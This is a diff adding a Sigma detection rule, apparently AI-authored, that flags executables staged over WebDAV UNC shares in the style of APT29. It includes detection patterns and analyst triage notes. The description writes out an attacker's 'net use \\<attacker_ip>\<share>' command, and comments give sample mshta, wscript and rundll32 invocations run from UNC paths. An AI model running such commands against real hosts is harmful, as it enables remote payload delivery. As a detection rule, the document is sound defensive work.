@@ -1,0 +1,157 @@
+title: Executable Staged via WebDAV UNC Share Using net.exe (APT29-Style)
+id: 3c82e1f4-7a09-4d6e-b901-2f5c8e47d3a9
+status: experimental
+description: |
+    Detects the host-side payload delivery pattern documented in the carnal0wnage
+    WebDAV technique (2012) and replayed in the OTRF APT29 ATT&CK Evals hackathon
+    dataset. The attacker stands up a WebDAV server (e.g. Metasploit
+    webdav_file_server, impacket-webdavserver, or Cobalt Strike WebDAV) serving an
+    executable over UNC. The victim host is induced — typically via a malicious
+    document macro, LNK, or phishing link — to call:
+
+        net use \\<attacker_ip>\<share>  [/user:... <password>]
+
+    followed by direct execution of the served PE from the UNC path. This technique
+    (T1105 + T1021.002) leaves two reliable process-creation events:
+
+      1. net.exe / net1.exe with a UNC argument (share mapping)
+      2. A child process whose image path starts with \\ (direct UNC execution)
+         OR a known execution broker (wscript, mshta, rundll32, etc.) whose
+         CommandLine references a \\ path
+
+    The rule fires when EITHER indicator appears. The net.exe condition alone is
+    medium-confidence because legitimate IT automation maps shares; combining it
+    with a suspicious parent (Office apps, browser, script hosts) lifts confidence
+    significantly — that filter is applied in condition branch 1b.
+
+    References:
+      - http://carnal0wnage.attackresearch.com/2012/06/webdav-server-to-download-custom.html
+      - https://github.com/OTRF/detection-hackathon-apt29
+      - https://attack.mitre.org/techniques/T1105/
+      - https://attack.mitre.org/techniques/T1021/002/
+
+author: Claude (based on carnal0wnage public research and OTRF APT29 evals dataset)
+date: 2026-06-06
+modified: 2026-06-06
+tags:
+    - attack.command-and-control
+    - attack.t1105               # Ingress Tool Transfer
+    - attack.lateral-movement
+    - attack.t1021.002           # SMB/Windows Admin Shares (WebDAV over UNC abuses same namespace)
+    - attack.execution
+    - attack.t1059.001           # PowerShell (common follow-on)
+    - tlp:white
+
+logsource:
+    category: process_creation
+    product: windows
+    # Tested against Sysmon EventID 1, Microsoft Defender for Endpoint DeviceProcessEvents,
+    # and CrowdStrike ProcessRollup2. Field names follow Sysmon conventions;
+    # map ParentImage → InitiatingProcessFolderPath etc. for MDE if needed.
+
+detection:
+
+    # ── Branch 1a: net.exe maps a UNC path (any parent) ─────────────────────
+    selection_net_unc_map:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+        CommandLine|contains:
+            - '\\'          # UNC prefix — net use \\server\share
+
+    # ── Branch 1b: same net.exe command but parent is a risky process ────────
+    #    This is the high-confidence variant: Office/browser/script-host
+    #    parents have no business mapping network shares.
+    selection_net_unc_map_risky_parent:
+        Image|endswith:
+            - '\net.exe'
+            - '\net1.exe'
+        CommandLine|contains:
+            - '\\'
+        ParentImage|endswith:
+            - '\WINWORD.EXE'
+            - '\EXCEL.EXE'
+            - '\POWERPNT.EXE'
+            - '\OUTLOOK.EXE'
+            - '\mshta.exe'
+            - '\wscript.exe'
+            - '\cscript.exe'
+            - '\powershell.exe'
+            - '\pwsh.exe'
+            - '\rundll32.exe'
+            - '\regsvr32.exe'
+            - '\certutil.exe'
+            - '\msedge.exe'
+            - '\chrome.exe'
+            - '\firefox.exe'
+
+    # ── Branch 2: process image lives on a UNC path (direct WebDAV execution) ─
+    #    Windows resolves \\server\share\evil.exe via WebDAV when the server
+    #    presents the right PROPFIND/OPTIONS responses. The resulting Sysmon
+    #    event captures the \\ path in Image or CurrentDirectory.
+    selection_unc_image_execution:
+        Image|startswith: '\\\\'      # Image path begins with \\
+
+    # ── Branch 3: execution broker runs something from a UNC path ────────────
+    #    Covers: mshta \\srv\s\a.hta, wscript \\srv\s\b.js, rundll32 \\srv\s\c.dll,EntryPoint
+    selection_broker_unc_cmdline:
+        Image|endswith:
+            - '\mshta.exe'
+            - '\wscript.exe'
+            - '\cscript.exe'
+            - '\rundll32.exe'
+            - '\regsvr32.exe'
+            - '\odbcconf.exe'
+        CommandLine|contains: '\\\\'  # CommandLine references \\server\...
+
+    # ── Filter: exclude common legitimate UNC share consumers ────────────────
+    filter_legitimate:
+        # Domain-joined backup agents, DFS health checks, SCCM, etc.
+        # Tune these to your environment; err on the side of keeping them
+        # narrow so as not to blind the rule.
+        Image|endswith:
+            - '\BackupExec.exe'
+            - '\robocopy.exe'
+            - '\xcopy.exe'
+        ParentImage|endswith:
+            - '\services.exe'         # Service-launched processes are lower risk
+
+    condition: >
+        (
+          selection_net_unc_map_risky_parent       # High confidence
+          or selection_unc_image_execution         # High confidence
+          or selection_broker_unc_cmdline          # Medium-high confidence
+          or selection_net_unc_map                 # Medium confidence (tune to env)
+        )
+        and not filter_legitimate
+
+falsepositives:
+    - IT automation scripts that map shares via net use (tune filter_legitimate)
+    - DFS path resolution during normal file-server access (usually via SYSTEM/service accounts — filter on User if needed)
+    - Software installers that temporarily map a share (rare but possible)
+    - Branch 2 / Branch 3 false positives are very rare in most environments
+
+level: high   # Lower to medium for selection_net_unc_map branch alone if noisy
+
+fields:
+    - Image
+    - CommandLine
+    - ParentImage
+    - ParentCommandLine
+    - User
+    - ProcessId
+    - ParentProcessId
+    - CurrentDirectory
+
+# ── Analyst notes ──────────────────────────────────────────────────────────────
+# Triage checklist:
+#   1. Is the mapped/executed UNC host an internal file server? If not, escalate.
+#   2. Examine the ParentImage ancestry — Office or browser parents = high priority.
+#   3. Check network logs (proxy/EDR) for WebDAV OPTIONS/PROPFIND to the same IP
+#      at the same timestamp — that confirms server-side setup.
+#   4. Hunt for child processes spawned from the resolved UNC path in the next 60s.
+#
+# Complementary detections to pair with this rule:
+#   - Sysmon EventID 3 (NetworkConnect) from net.exe/net1.exe to port 80/443/445
+#   - Zeek http.log: c-useragent contains "WebDAV" AND resp_mime_types contains "dosexec"
+#   - Windows Security EventID 5140/5145 (share access) if file-server logging is available
